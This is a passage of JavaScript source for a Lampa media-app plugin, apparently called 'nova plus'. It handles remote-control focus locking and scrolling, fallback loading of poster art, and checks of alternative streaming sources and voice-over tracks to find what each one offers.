            var result = toggle.apply(this, arguments);
            keepFocus();
            scrollThaw(frozen);
            return result;
          };
        }
      }
      return add.apply(Lampa.Controller, arguments);
    };

    Lampa.Controller.nova_plus_wrapped = true;
  }

  function activeFilter(root) {
    for (var i = 0; i < filters.length; i++) {
      try {
        if ($.contains(root[0], filters[i].render()[0])) return filters[i];
      } catch (e) {}
    }
    return null;
  }

  function activeScroll(node) {
    for (var i = 0; i < scrolls.length; i++) {
      try {
        var render = scrolls[i].render();
        if (render && render.length && $.contains(render[0], node)) return scrolls[i];
      } catch (e) {}
    }
    return null;
  }

  function scrollAim(node) {
    try {
      var box = $(node).closest('.scroll');
      if (!box.length) return node;
      var seat = box[0].offsetHeight || 0;
      var drop = $(node).closest('.nova-drop');
      if (drop.length) {
        var deep = drop[0].offsetHeight || 0;
        if (!seat || !deep) return node;
        if (deep > seat - 4) return node;
        return drop[0];
      }
      var hero = $(node).closest('.nova-hero');
      if (!hero.length) return node;
      var high = hero[0].offsetHeight || 0;
      if (!high) return node;
      if (high > seat - 4) return node;
      return hero[0];
    } catch (e) {
      return node;
    }
  }

  function scrollSeen(node) {
    try {
      var box = $(node).closest('.scroll');
      if (!box.length) return false;
      var high = box[0].offsetHeight || 0;
      if (!high) return false;
      var top = node.getBoundingClientRect().top - box[0].getBoundingClientRect().top;
      return top > -1 && (top + (node.offsetHeight || 0)) <= high + 1;
    } catch (e) {
      return false;
    }
  }

  function gentleMark(span) {
    gentle_until = Date.now() + (span || 400);
  }

  function gentleNow() {
    return Date.now() < gentle_until;
  }

  function scrollTo(element, gentle) {
    if (wideOn() && wideFollow(element)) return;
    var node = element instanceof jQuery ? element[0] : element;
    if (!node) return;
    node = scrollAim(node);
    if ((gentle || gentleNow()) && scrollSeen(node)) return;
    if ((gentle || gentleNow()) && handNow() && !pressNow()) return;
    var scroll = activeScroll(node);
    if (scroll) {
      try {
        scroll.update($(node), true);
        return;
      } catch (e) {}
    }
    try {
      var box = $(node).closest('.scroll');
      if (!box.length) return;
      var body = box.find('.scroll__body').first();
      if (!body.length) return;
      var top = node.getBoundingClientRect().top - box[0].getBoundingClientRect().top;
      var seat = box[0].offsetHeight || 0;
      var lift = Math.round(Math.max(20, seat / 2 - (node.offsetHeight || 0) / 2));
      var style = body[0].style['-webkit-transform'] || body[0].style.transform || '';
      if (style.indexOf('translate') !== -1) {
        var pair = style.match(/-?[\d.]+px,\s*(-?[\d.]+)px/);
        var now = pair ? parseFloat(pair[1]) || 0 : 0;
        var next = Math.min(0, Math.round(now - top + lift));
        body[0].style['-webkit-transform'] = 'translate3d(0px, ' + next + 'px, 0px)';
        body[0].style.transform = 'translate3d(0px, ' + next + 'px, 0px)';
      } else {
        box[0].scrollTop = Math.max(0, box[0].scrollTop + top - lift);
      }
    } catch (e) {}
  }

  function contentEnable() {
    try {
      var now = Lampa.Controller.enabled();
      if (now && now.name === 'content') return;
    } catch (e) {}
    try { Lampa.Controller.enable('content'); } catch (e) {}
  }

  function scrollFreeze() {
    if (!ui.root) return null;
    try {
      var body = ui.root.closest('.scroll').find('.scroll__body').first();
      if (!body.length) return null;
      body.addClass('notransition');
      return body;
    } catch (e) {}
    return null;
  }

  function scrollThaw(body) {
    if (!body) return;
    setTimeout(function () {
      try { body.removeClass('notransition'); } catch (e) {}
    }, 0);
  }

  function dropRow() {
    if (!ui_open || !ui.rows || !ui.rows.length) return null;
    var row = ui.rows.find('.nova-drop').first();
    return row.length ? row : null;
  }

  function dropShow() {
    var row = dropRow();
    if (!row) return;
    try {
      var node = row[0];
      var box = row.closest('.scroll');
      if (!box.length) return;
      var seat = box[0].offsetHeight || 0;
      var deep = node.offsetHeight || 0;
      if (!seat || !deep) return;
      var top = node.getBoundingClientRect().top - box[0].getBoundingClientRect().top;
      var fits = deep <= seat - 4;
      if (fits) {
        if (top > -1 && top + deep <= seat + 1) return;
      } else {
        if (top > -1 && top <= 24) return;
        if (last && $.contains(node, last) && scrollSeen(last) &&
            last.getBoundingClientRect().top > node.getBoundingClientRect().top + 4) return;
      }
      var scroll = activeScroll(node);
      if (scroll) {
        try {
          scroll.update(row, fits);
          return;
        } catch (e) {}
      }
      var body = box.find('.scroll__body').first();
      if (!body.length) return;
      var lift = fits ? Math.round((seat - deep) / 2) : 4;
      var style = body[0].style['-webkit-transform'] || body[0].style.transform || '';
      if (style.indexOf('translate') !== -1) {
        var pair = style.match(/-?[\d.]+px,\s*(-?[\d.]+)px/);
        var now = pair ? parseFloat(pair[1]) || 0 : 0;
        var next = Math.min(0, Math.round(now - top + lift));
        body[0].style['-webkit-transform'] = 'translate3d(0px, ' + next + 'px, 0px)';
        body[0].style.transform = 'translate3d(0px, ' + next + 'px, 0px)';
      } else {
        box[0].scrollTop = Math.max(0, box[0].scrollTop + top - lift);
      }
    } catch (e) {}
  }

  function dropShowSoon() {
    setTimeout(dropShow, 0);
    setTimeout(dropShow, 140);
  }

  var ui = {};
  var root = null;
  var host = null;
  var items = [];
  var groups = { season: null, voice: null, sort: null };
  var extras = [];
  var extra_menu = null;
  var capturing = false;
  var captured = null;
  var chip_actions = {};
  var filter = null;
  var movie = null;
  var serial = false;
  var nav = false;
  var last = null;

  var ui_open = '';
  var ui_focus = '';
  var ui_lock = '';
  var ui_lock_time = 0;
  var ui_lock_span = 8000;
  var lock_timer = null;
  var focusing = false;
  var press_at = 0;
  var gentle_until = 0;
  var ui_page = -1;
  var ui_page_focus = -1;
  var ui_all_sources = false;
  var signature = '';
  var note_sig = '';
  var busy = false;

  var pending = null;
  var switch_observer = null;
  var leave_guard = null;

  function forget() {
    if (pendingLive() && ui.root) {
      root = null;
      host = null;
      items = [];
      groups = { season: null, voice: null, sort: null };
      extras = [];
      filter = null;
      signature = '';
      note_sig = '';
      busy = false;
      ui_open = '';
      ui_page = -1;
      ui_page_focus = -1;
      return;
    }

    pending = null;
    inplaceStop();
    ui = {};
    root = null;
    host = null;
    items = [];
    groups = { season: null, voice: null, sort: null };
    extras = [];
    extra_menu = null;
    captured = null;
    capturing = false;
    filter = null;
    movie = null;
    last = null;
    ui_open = '';
    ui_focus = '';
    ui_lock = '';
    ui_lock_time = 0;
    focusing = false;
    ui_page = -1;
    ui_page_focus = -1;
    ui_all_sources = false;
    signature = '';
    note_sig = '';
    busy = false;
  }

  function readGroups(inst) {
    var out = { season: null, voice: null, sort: null };
    if (!inst || !inst.nova_sets) return out;

    (inst.nova_sets.filter || []).forEach(function (group) {
      if (!group || !group.items || !group.items.length) return;
      if (group.stype === 'season') out.season = group;
      if (group.stype === 'voice') out.voice = group;
    });

    var sort = inst.nova_sets.sort || [];
    if (sort.length) out.sort = sort;
    return out;
  }

  function nativeOnlineSelector(selector) {
    return selector + ',' + selector.replace(/\.online-(prestige|empty)/g, '.onl-online-$1');
  }

  function scope() {
    if (!enabled()) return null;

    var current;
    try { current = Lampa.Activity.active(); } catch (e) { return null; }
    if (!current || !current.activity) return null;
    var box;
    try { box = current.activity.render(); } catch (e) { return null; }
    if (!box || !box.length) return null;
    if (!box.hasClass('explorer')) box = box.find('.explorer').first();
    if (!box.length) return null;

    var body = box.find('.explorer__files-body .scroll__body').first();
    if (!body.length) return null;
    if (body.find('.torrent-item').length) return null;

    wideEvict(body);

    var card = current.movie || current.card;
    if (!card) return null;

    return { root: box, body: body, movie: card };
  }

  function sourceTitle() {
    var sort = groups.sort || [];
    for (var i = 0; i < sort.length; i++) {
      if (sort[i].selected) return sort[i].title || '';
    }
    return sort.length ? (sort[0].title || '') : '';
  }

  var KNOWN_BUTTONS = '.filter--search,.filter--sort,.filter--filter,.filter--back,.filter--reset';

  function readExtras() {
    var out = [];
    if (!root) return out;
    var head = root.find('.explorer__files-head').first();
    if (!head.length) return out;

    head.find('.simple-button.selector').each(function () {
      var node = $(this);
      if (node.is(KNOWN_BUTTONS) || node.closest('.nova-plus-root').length) return;
      var label = node.children('span').first().text().trim();
      var value = node.children('div').not('.hide').last().text().trim();
      if (!value) value = node.children('div').last().text().trim();
      if (!label && !value) return;
      out.push({ node: node, label: label, value: value || label });
    });
    return out;
  }

  function extrasStamp() {
    return extras.map(function (entry) {
      return entry.label + '=' + entry.value;
    }).join(',');
  }

  function focusKey(item) {
    var name = item ? String(item.source || item.title || '') : '';
    return 'src:' + name.replace(/["\\]/g, '');
  }

  function currentSourceKey() {
    var sort = groups.sort || [];
    for (var i = 0; i < sort.length; i++) {
      if (sort[i].selected) return sort[i].source || sort[i].title || '';
    }
    return '';
  }

  function seasonNumber() {
    return groups.season ? digits(groups.season.subtitle) : 0;
  }

  function partTitle(value) {
    var raw = String(value == null ? '' : value).trim();
    if (!raw) return '';
    var num = digits(raw);
    return num ? String(num) : raw;
  }

  function artSize() {
    var want = String(get('nova_plus_art_size', 'auto') || 'auto');
    if (want === 'w780' || want === 'w1280' || want === 'original') return want;
    var pixels = 0;
    try {
      pixels = (window.innerWidth || 0) * (window.devicePixelRatio || 1);
    } catch (e) {
      pixels = 0;
    }

    return pixels >= 1100 ? 'w1280' : 'w780';
  }

  function artFields() {
    if (!movie) return [];
    return [movie.backdrop_path, movie.poster_path, movie.img, movie.background_image,
      movie.backdrop, movie.poster, movie.still_path, movie.cover, movie.background];
  }

  function pickArt(size) {
    var list = artFields();
    for (var i = 0; i < list.length; i++) {
      var art = image(list[i], size);
      if (art) return art;
    }
    try { return Lampa.Utils.cardImgBackground(movie) || ''; } catch (e) {}
    return '';
  }

  function heroArt() {
    return pickArt(artSize());
  }

  function fallbackArt() {
    return pickArt('w300');
  }

  function bustArt(url) {
    if (!url || !/^https?:/i.test(url)) return '';
    if (url.indexOf('nova_art=') !== -1) return '';
    return url + (url.indexOf('?') === -1 ? '?' : '&') + 'nova_art=1';
  }

  function artChain() {
    var main = heroArt();
    var spare = fallbackArt();
    var list = [];
    [main, bustArt(main), spare, bustArt(spare)].forEach(function (url) {
      if (url && list.indexOf(url) === -1) list.push(url);
    });
    return list;
  }

  function heroArtDraw(hero) {
    if (!hero) return;
    var back = hero.find('.nova-hero__bg');
    var node = hero.find('.nova-hero__bg img')[0];
    if (!back.length || !node) return;

    var chain = artChain();
    if (!chain.length) return;
    var at = 0;

    node.onload = function () { back.addClass('nova-hero__bg--loaded'); };
    node.onerror = function () {
      back.removeClass('nova-hero__bg--loaded');
      at++;
      if (at >= chain.length) return;
      node.src = chain[at];
    };
    node.src = chain[0];
  }

  function runtimeText(seconds) {
    try { return Lampa.Utils.secondsToTime(seconds, true); } catch (e) { return ''; }
  }

  function pressMark() {
    press_at = Date.now();
  }

  function pressNow() {
    return press_at > 0 && Date.now() - press_at < 500;
  }

  var hand_at = 0;

  function handMark() {
    hand_at = Date.now();
  }

  function handNow() {
    return hand_at > 0 && Date.now() - hand_at < 1200;
  }

  function handWatch() {
    var names = ['touchmove', 'wheel', 'mousewheel'];
    names.forEach(function (name) {
      try {
        window.addEventListener(name, handMark, { passive: true, capture: true });
      } catch (e) {
        try { window.addEventListener(name, handMark, true); } catch (err) {}
      }
    });
  }

  function lockFocus(key, span) {
    ui_lock = key || '';
    ui_lock_span = span || 8000;
    ui_lock_time = ui_lock ? Date.now() : 0;
    if (ui_lock) {
      ui_focus = ui_lock;
      lockWatch();
    }
  }

  function lockWatch() {
    if (lock_timer) return;
    lock_timer = setInterval(function () {
      if (!lockActive() || !inSkin()) return lockStopWatch();
      if (pressNow()) return;
      var wanted = seek(ui_lock);
      if (!wanted || !wanted.length) return;
      if (wanted.hasClass('focus')) return;
      if (last && wanted[0] === last) return;
      if (handNow()) return;
      var here = ui.root.find('.focus');
      if (here.length && here[0] !== wanted[0] &&
          here.closest('.nova-drop').length > 0) return lockStopWatch(true);
      if (here.length && !heroKey(here.attr('data-nova-focus') || '') &&
          here.closest('.nova-toolbar,.nova-drop').length === 0) {
        return lockStopWatch(true);
      }
      focusNode(wanted, true);
    }, 120);
  }

  function lockStopWatch(release) {
    clearInterval(lock_timer);
    lock_timer = null;
    if (release) lockRelease();
  }

  function heroKey(key) {
    return key === 'hero' || key === 'hero-next';
  }

  function lockActive() {
    if (!ui_lock) return false;
    if (Date.now() - ui_lock_time > (ui_lock_span || 8000)) {
      lockRelease();
      return false;
    }
    return true;
  }

  function lockRelease() {
    ui_lock = '';
    ui_lock_time = 0;
    clearInterval(lock_timer);
    lock_timer = null;
  }

  function chipSeat(node) {
    try {
      return $(node).closest('.nova-toolbar,.nova-drop').length > 0;
    } catch (e) {
      return false;
    }
  }

  function bind(element, enter, long) {
    element.on('hover:enter', function () {
      try { enter(); } catch (e) {}
    }).on('hover:focus', function (e) {
      var key = $(e.target).attr('data-nova-focus') || '';
      last = e.target;
      scrollTo(e.target, chipSeat(e.target));
      if (lockActive() && key !== ui_lock) {
        var stolen = false;
        if (!focusing && !pressNow() && ui_open) {
          try { stolen = $(e.target).closest('.nova-toolbar').length > 0; } catch (e2) { stolen = false; }
        }
        if ((heroKey(key) && !pressNow()) || stolen) {
          if (focusing) return;
          var back = seek(ui_lock);
          if (back && back.length && back[0] !== e.target) return focusNode(back);
          return;
        }
        lockRelease();
      }
      ui_focus = key;
    }).on('hover:hover', function (e) {
      if (focusing) return;
      handMark();
      var hover_key = $(e.target).attr('data-nova-focus') || '';
      last = e.target;
      if (lockActive() && hover_key && hover_key !== ui_lock) lockRelease();
      if (hover_key) ui_focus = hover_key;
    });
    if (long) {
      element.on('hover:long', function () {
        try { long(); } catch (e) {}
      });
    }
    return element;
  }

  function dropStale() {
    if (!host) return;
    var mine = ui.root && ui.root[0];
    $(host).find('.nova-plus-root').each(function () {
      if (this === mine) return;
      try { $(this).remove(); } catch (e) {}
    });
  }

  function uiFrame() {
    if (ui.root && ui.wide !== wideOn()) wideDropFrame();
    if (!ui.root) {
      ui.root = $('<div class="nova nova-plus-root"></div>');
      ui.hero_box = $('<div class="nova__hero"></div>');
      ui.rows = $('<div class="nova__rows"></div>');
      ui.list = $('<div class="nova__list"></div>');
      ui.wide = wideOn();
      if (ui.wide) {
        ui.root.addClass('nova-plus');
        ui.strip = $('<div class="nova-plus__strip"></div>').append(ui.list);
        ui.root.append(ui.hero_box).append(ui.rows).append(ui.strip);
      } else {
        ui.root.removeClass('nova-plus');
        ui.root.append(ui.hero_box).append(ui.rows).append(ui.list);
      }
    }
    if (!ui.root.parent().length || !$.contains(host, ui.root[0])) {
      dropStale();
      $(host).prepend(ui.root);
      rebind();
    }
    dropStale();
    return ui.root;
  }

  function rebind() {
    if (!ui.root) return;

    var play = ui.root.find('[data-nova-focus="hero"]').first();
    if (play.length) {
      ui.play = play;
      bindPlay(play.off('hover:enter hover:focus hover:long'));
    }

    var next = ui.root.find('[data-nova-focus="hero-next"]').first();
    if (next.length) {
      ui.next = next;
      bindNext(next.off('hover:enter hover:focus hover:long'));
    }

    ui.rows.find('.nova-toolbar [data-nova-focus]').each(function () {
      var box = $(this);
      var key = box.attr('data-nova-focus');
      var action = chip_actions[key];
      box.off('hover:enter hover:focus hover:long');
      bind(box, action ? action.enter : function () { uiToggle(key); },
        action ? action.long : null);
    });

    ui.rows.find('.nova-drop').remove();
  }

  function switchStart(key) {
    if (!movie) return;
    gentleMark(1200);
    pending = { id: movie.id, key: key || '', time: Date.now() };
    lockFocus(key);
    switchMark(true);
    switchWatch();
  }

  function switchWatch() {
    if (switch_observer || !window.MutationObserver) return;
    var target;
    try { target = document.body; } catch (e) { return; }
    if (!target) return;
    try {
      switch_observer = new MutationObserver(function () {
        if (!pendingLive()) return switchUnwatch();
        reattach();
      });
      switch_observer.observe(target, { childList: true, subtree: true });
    } catch (e) { switch_observer = null; }
  }

  function switchUnwatch() {
    if (switch_observer) {
      try { switch_observer.disconnect(); } catch (e) {}
    }
    switch_observer = null;
  }

  function switchMark(on) {
    try {
      var body = document.body;
      if (!body) return;
      var name = 'nova-plus-switching';
      var list = ' ' + (body.className || '') + ' ';
      var has = list.indexOf(' ' + name + ' ') !== -1;
      if (on && !has) body.className = (body.className ? body.className + ' ' : '') + name;
      else if (!on && has) body.className = list.split(' ' + name + ' ').join(' ').replace(/^\s+|\s+$/g, '');
    } catch (e) {}
  }

  var inplace = false;
  var inplace_timer = null;
  var swallow = false;
  var real_replace = null;
  var hop = { id: 0, tried: {} };
  var hop_timer = null;
  var probe_url = '';
  var probe_timer = null;
  var probe_busy = false;
  var probe_nets = [];
  var probe_done_for = 0;

  var voice_seen = { id: 0, season: 0, origin: '', list: [] };
  var voice_timer = null;
  var voice_busy = false;
  var voice_generation = 0;
  var voice_run_stamp = '';
  var voice_seed_generation = 0;
  var voice_nets = [];
  var voice_done = '';
  var voice_seed_busy = false;
  var voice_seed_done = '';
  var voice_seed_net = null;
  var voice_retry_timer = null;
  var voice_retry_stamp = '';
  var voice_group_retry_timer = null;
  var voice_group_retry_until = 0;
  var VOICE_SEED_TIMEOUT = 6000;
  var VOICE_PARALLEL = 2;
  var VOICE_TIMEOUT = 6000;
  var VOICE_BUDGET = 30000;
  var VOICE_DELAY = 500;
  var VOICE_OWN_PARAMS = ['id', 'imdb_id', 'kinopoisk_id', 'title', 'original_title',
    'original_language', 'serial', 'year', 'source', 'clarification', 'similar',
    's', 'e', 't', 'voice', 'translation', 'season', 'episode', 'number',
    'rjson', 'nojson', 'life', 'box'];

  var probe_queue = {};
  var PROBE_TIMEOUT = 7000;
  var PROBE_PARALLEL = 2;
  var PROBE_LIMIT = 12;
  var PROBE_BUDGET = 20000;
  var PROBE_DELAY = 1500;

  function componentNow() {
    try {
      var current = Lampa.Activity.active();
      return (current && current.activity && current.activity.component) || null;
    } catch (e) {
      return null;
    }
  }

  function reloadable(comp) {
    if (!comp || comp.destroyed) return false;
    if (typeof comp.createSource !== 'function') return false;
    if (typeof comp.search !== 'function' && typeof comp.find !== 'function') return false;
    return true;
  }

  function autoSwitchOn() {
    return get('nova_plus_auto_switch', true) !== false;
  }

  function lifeKnown() {
    var list = groups.sort || [];
    for (var i = 0; i < list.length; i++) {
      if (list[i] && typeof list[i].ghost !== 'undefined') return true;
    }
    return false;
  }

  function sourceState(key) {
    if (!movie) return '';
    var list = probeCache(movie.id).list || {};
    return list[key] ? list[key].s : '';
  }

  function sourceRank(item) {
    var key = item.source || item.title;
    var state = sourceState(key);
    if (state === 'ok') return 0;
    if (state === 'empty') return 3;
    if (item.ghost) return 3;
    if (lifeKnown()) return 0;
    if (knownQuality(key)) return 1;
    return 2;
  }

  function nextSource() {
    var list = groups.sort || [];
    var pool = [];

    for (var i = 0; i < list.length; i++) {
      var item = list[i];
      var key = item.source || item.title;
      if (!key || item.selected) continue;
      if (hop.tried[key]) continue;
      var rank = sourceRank(item);
      if (rank >= 3) continue;
      pool.push({
        item: item,
        rank: rank,
        quality: QUALITY_RANK[knownQuality(key) || splitSourceName(item.title).badge] || 0,
        seat: i
      });
    }

    pool.sort(function (a, b) {
      return (a.rank - b.rank) || (b.quality - a.quality) || (a.seat - b.seat);
    });

    return pool.length ? pool[0].item : null;
  }

  function hopReset() {
    var id = movie ? movie.id : 0;
    if (hop.id !== id) hop = { id: id, tried: {} };
  }

  function hopStop() {
    clearInterval(hop_timer);
    hop_timer = null;
  }

  function hostTimerStop(native) {
    try {
      native.node.find(nativeOnlineSelector('.online-empty__button.cancel')).trigger('hover:enter');
    } catch (e) {}
    try {
      if (Lampa.Timer && typeof Lampa.Timer.remove === 'function') {
        native.node.find('.timeout').text('');
      }
    } catch (e) {}
  }

  function probeOn() {
    return get('nova_plus_probe', false) === true;
  }

  function probeCovered() {
    if (!movie) return false;
    var list = groups.sort || [];
    if (list.length < 2) return false;

    var known = probeCache(movie.id).list || {};
    var here = currentSourceKey();
    var total = 0;
    var seen = 0;

    list.forEach(function (item) {
      var key = item.source || item.title;
      if (!key || key === here) return;
      total++;
      if (known[key]) seen++;
    });
    return total > 0 && seen === total;
  }

  function probeAuto() {
    if (lifeKnown()) return 'external';
    if (probeCovered()) return 'external';
    return '';
  }

  function probeHook() {
    var mode = '';
    try {
      if (typeof window.nova_skin_probe_mode === 'function') mode = window.nova_skin_probe_mode();
    } catch (e) {
      mode = '';
    }
    if (mode === 'external' || mode === 'disabled' || mode === 'legacy') return mode;
    return '';
  }

  var probe_auto_memo = '';
  var probe_auto_stamp = '';

  function probeMode() {
    var hook = probeHook();
    if (hook) return hook;

    var stamp = [
      movie ? movie.id : '',
      (groups.sort || []).length,
      currentSourceKey(),
      probe_saves
    ].join('|');

    if (probe_auto_stamp !== stamp) {
      probe_auto_stamp = stamp;
      probe_auto_memo = probeAuto();
    }
    return probe_auto_memo || 'legacy';
  }

  function probeAllowed() {
    return probeMode() === 'legacy' && probeOn();
  }

  function probeShow() {
    var mode = probeMode();
    if (mode === 'disabled') return false;
    if (mode === 'external' && probeHook() === 'external') return true;
    return probeOn();
  }

  function probeUrlFor(key) {
    if (!probe_url || !key) return '';
    return probe_url.replace(/(\/lite\/)[^\/?&]+/, '$1' + encodeURIComponent(key));
  }

  function probeStop() {
    probe_busy = false;
    probe_queue = {};
    clearTimeout(probe_timer);
    probe_timer = null;
    probe_nets.forEach(function (net) {
      try { net.clear(); } catch (e) {}
    });
    probe_nets = [];
    if (ui.rows) ui.rows.find('.nova-chip--checking').removeClass('nova-chip--checking');
  }

  function probeChip(key) {
    if (!ui.rows) return null;
    var found = ui.rows.find('[data-nova-src="' + key + '"]');
    return found.length ? found : null;
  }

  function probeMark(key, state) {
    delete probe_queue[key];
    var chip = probeChip(key);
    if (!chip) return;

    chip.removeClass('nova-chip--checking nova-chip--empty');
    chip.find('.nova-chip__dot').remove();

    var value = knownQuality(key);
    if (value) {
      var badge = chip.find('.nova-chip__badge');
      if (badge.length) badge.text(value);
      else chip.prepend($('<span class="nova-chip__badge"></span>').text(value));
    }

    if (state === 'empty') chip.addClass('nova-chip--empty');
    else if (state === 'ok') chip.append('<span class="nova-chip__dot"></span>');
  }

  function probeAnswer(key, answer) {
    if (!probe_busy) return;
    var body = typeof answer === 'string' ? answer : '';

    if (!body) return probeMark(key, 'skip');
    if (body.indexOf('"rch"') !== -1) return probeMark(key, 'skip');
    if (body.indexOf('"accsdb"') !== -1 || body.indexOf('"blocked"') !== -1) {
      return probeMark(key, 'skip');
    }

    var found = (body.match(/videos__item/g) || []).length ||
      (body.match(/"method"\s*:\s*"(play|call|link)"/g) || []).length;

    if (found) {
      var best = '';
      var marks = body.match(/(2160|1440|1080|720|576|480|360)\s*p/gi) || [];
      marks.forEach(function (mark) {
        var label = shortQuality(mark);
        if ((QUALITY_RANK[label] || 0) > (QUALITY_RANK[best] || 0)) best = label;
      });
      if (/4k|uhd/i.test(body)) best = '4K';
      if (best) rememberQuality(key, best);
      if (movie) probeSave(movie.id, key, 'ok', found);
      return probeMark(key, 'ok');
    }

    if (!/videos__|"method"|online-prestige|"data"/i.test(body)) return probeMark(key, 'skip');
    if (movie) probeSave(movie.id, key, 'empty', 0);
    probeMark(key, 'empty');
  }

  function probeRun() {
    if (!probeAllowed() || !probe_url || !movie) return;
    if (lifeKnown()) return;
    var list = groups.sort || [];
    if (list.length < 2) return;

    probeStop();
    probe_busy = true;
    probe_queue = {};

    var known = probeCache(movie.id).list || {};
    var here = currentSourceKey();
    var queue = [];

    list.forEach(function (item) {
      var key = item.source || item.title;
      if (!key || key === here) return;
      if (known[key]) return probeMark(key, known[key].s);
      if (!probeUrlFor(key)) return;
      queue.push({ item: item, key: key, rank: sourceRank(item) });
    });

    queue.sort(function (a, b) {
      return a.rank - b.rank;
    });
    queue = queue.slice(0, PROBE_LIMIT);
    if (!queue.length) {
      probe_busy = false;
      return;
    }

    queue.forEach(function (entry) {
      probe_queue[entry.key] = true;
      var chip = probeChip(entry.key);
      if (chip) chip.addClass('nova-chip--checking');
    });

    var deadline = Date.now() + PROBE_BUDGET;
    var index = 0;

    var step = function () {
      if (!probe_busy || index >= queue.length) return;
      if (Date.now() > deadline) return probeStop();

      var entry = queue[index++];
      var net = null;
      try { net = new Lampa.Reguest(); } catch (e) { net = null; }
      if (!net) return probeStop();

      probe_nets.push(net);
      try { net.timeout(PROBE_TIMEOUT); } catch (e) {}

      var done = function (answer) {
        probeAnswer(entry.key, answer);
        step();
      };

      try {
        net['native'](probeUrlFor(entry.key), done, function () {
          probeAnswer(entry.key, '');
          step();
        }, false, { dataType: 'text' });
      } catch (e) {
        probeAnswer(entry.key, '');
        step();
      }
    };

    for (var worker = 0; worker < PROBE_PARALLEL; worker++) step();
  }

  function probeSchedule() {
    if (!probeAllowed() || !movie) return;
    if (probe_done_for === movie.id) return;
    clearTimeout(probe_timer);
    probe_timer = setTimeout(function () {
      probe_timer = null;
      if (!inSkin() || !movie) return;
      probe_done_for = movie.id;
      probeRun();
    }, PROBE_DELAY);
  }

  function voiceSeedStop() {
    voice_seed_generation++;
    voice_seed_busy = false;
    if (voice_seed_net) {
      try { voice_seed_net.clear(); } catch (e) {}
    }
    voice_seed_net = null;
  }

  function voiceStop() {
    voice_generation++;
    voice_busy = false;
    clearTimeout(voice_timer);
    voice_timer = null;
    voice_nets.forEach(function (net) {
      try { net.clear(); } catch (e) {}
    });
    voice_nets = [];
    voiceSeedStop();
  }

  function voiceWanted() {
    if (!movie || !serial || nav) return false;
    var group = groups.voice;
    if (!group || !group.items || group.items.length < 2) return false;
    return true;
  }

  function voiceListFresh() {
    if (!movie) return false;
    if (!voice_seen.list || voice_seen.list.length < 2) return false;
    if (voice_seen.id && movie.id && voice_seen.id !== movie.id) return false;
    if ((voice_seen.season || 0) !== (seasonNumber() || 0)) return false;
    return true;
  }

  function voiceFresh() {
    return voiceWanted() && voiceListFresh();
  }

  function voiceNorm(name) {
    var value = String(name == null ? '' : name).toLowerCase();
    value = value.split('\u00a0').join(' ').split('\u0451').join('\u0435');
    value = value.replace(/\[[^\]]*\]/g, ' ');
    value = value.replace(/\([^)]*\)/g, ' ');
    value = value.replace(/\b(2160|1440|1080|720|576|480|360)p?\b/g, ' ');
    value = value.replace(/\b(4k|uhd|fhd|hd|web ?dl|webrip|bdrip|hdtv|dvdrip)\b/g, ' ');
    value = value.replace(/профессиональн\w*/g, ' professional ');
    value = value.replace(/оригинальн\w*/g, ' original ');
    value = value.replace(/^(ru|en|gb|uk|ua)\s+/i, '');
    value = value.replace(/\b(ru|en|gb|uk|ua)\b/gi, ' ');
    value = value.replace(/[^0-9a-z\u0400-\u04ff]+/g, ' ');
    return value.replace(/\s+/g, ' ').replace(/^ | $/g, '');
  }

  function voiceIndex() {
    var exact = {};
    var rows = [];
    (voice_seen.list || []).forEach(function (entry, seat) {
      if (!entry) return;
      var key = voiceNorm(entry.name);
      if (!key) return;
      var row = { key: key, entry: entry, seat: seat };
      rows.push(row);
      if (!exact[key]) exact[key] = row;
    });
    return { exact: exact, rows: rows };
  }

  function voiceNear(book, name, used) {
    var key = voiceNorm(name);
    if (!key) return null;
    var best = null;
    var score = -1;
    var tie = false;
    book.rows.forEach(function (row) {
      if (used[row.seat]) return;
      var value = -1;
      if (row.key === key) value = 100;
      else if (row.key.indexOf(key) === 0 || key.indexOf(row.key) === 0) {
        value = 80 - Math.abs(row.key.length - key.length);
      } else if (Math.min(row.key.length, key.length) >= 4 &&
        (row.key.indexOf(key) !== -1 || key.indexOf(row.key) !== -1)) {
        value = 50 - Math.abs(row.key.length - key.length);
      }
      if (value < 0) return;
      if (value > score) {
        score = value;
        best = row;
        tie = false;
      } else if (value === score && best && row.seat !== best.seat) tie = true;
    });
    return tie ? null : best;
  }

  function voiceDropParam(url, name) {
    var value = String(url || '');
    var at = value.indexOf('?');
    if (at === -1) return value;
    var head = value.slice(0, at);
    var tail = [];
    value.slice(at + 1).split('&').forEach(function (pair) {
      if (!pair) return;
      if (pair.split('=')[0].toLowerCase() === name) return;
      tail.push(pair);
    });
    return tail.length ? head + '?' + tail.join('&') : head;
  }

  function voiceSeedStale(url) {
    if (!movie || !movie.id) return false;
    var mark = String(url || '').match(/[?&]id=(\d+)/);
    if (!mark) return false;
    return String(movie.id) !== mark[1];
  }

  function voiceSeedUrls() {
    if (!probe_url) {
      try {
        var hostComp = componentNow();
        if (hostComp && typeof hostComp.getChoice === 'function') {
          var saved = hostComp.getChoice();
          if (saved && saved.voice_url) learnUrl(saved.voice_url);
        }
      } catch (e) {}
    }
    var base = String(probe_url || '');
    if (!base || base.indexOf('/lite/') === -1) return [];
    if (voiceSeedStale(base)) return [];

    base = voiceDropParam(base, 'e');
    base = voiceDropParam(base, 'episode');
    base = voiceDropParam(base, 't');
    base = voiceDropParam(base, 'voice');
    base = voiceDropParam(base, 'translation');

    var season = seasonNumber() || 0;
    var out = [];

    var push = function (value) {
      if (!value) return;
      if (season) {
        if (/[?&]s=\d*/.test(value)) value = value.replace(/([?&]s=)\d*/, '$1' + season);
        else value += (value.indexOf('?') === -1 ? '?' : '&') + 's=' + season;
      }
      if (out.indexOf(value) === -1) out.push(value);
    };

    if (base.indexOf('rjson=') !== -1) {
      push(base.split('rjson=').join('nojson='));
      push(voiceDropParam(base, 'rjson'));
    } else {
      push(base + (base.indexOf('?') === -1 ? '?' : '&') + 'nojson=1');
      push(base);
    }
    return out;
  }

  function voiceSeed(after) {
    if (voice_seed_busy) return;
    if (!voiceWanted()) return;

    var urls = voiceSeedUrls();
    if (!urls.length) return;

    var stamp = [movie.id, currentSourceKey(), seasonNumber() || 0].join('|');
    if (voice_seed_done === stamp) return;
    voice_seed_done = stamp;
    voice_seed_busy = true;
    var generation = ++voice_seed_generation;

    var seat = 0;

    var finish = function () {
      if (generation !== voice_seed_generation) return;
      voice_seed_busy = false;
      voice_seed_net = null;
      if (typeof after === 'function') after();
    };

    var step = function () {
      if (!voice_seed_busy || generation !== voice_seed_generation) return;
      if (seat >= urls.length || !inSkin() || !movie) return finish();

      var url = urls[seat++];
      var net = null;
